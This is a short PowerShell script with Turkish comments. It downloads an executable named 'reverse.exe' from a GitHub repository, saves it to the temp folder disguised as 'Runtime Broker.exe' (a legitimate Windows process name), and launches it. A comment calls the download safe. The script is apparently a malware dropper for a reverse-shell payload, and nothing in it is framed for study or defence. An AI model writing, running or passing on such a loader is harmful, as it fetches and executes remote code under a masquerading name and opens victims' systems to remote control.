# TLS 1.2'yi etkinleştir
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url = 'https://github.com/OhioDucky/awsomesites.github.io/raw/main/reverse.exe'
$tempPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'Runtime Broker.exe')

# Güvenli bir şekilde dosyayı indir
$client = New-Object System.Net.WebClient
$client.DownloadFile($url, $tempPath)

# Dosyayı çalıştır
Start-Process $tempPath
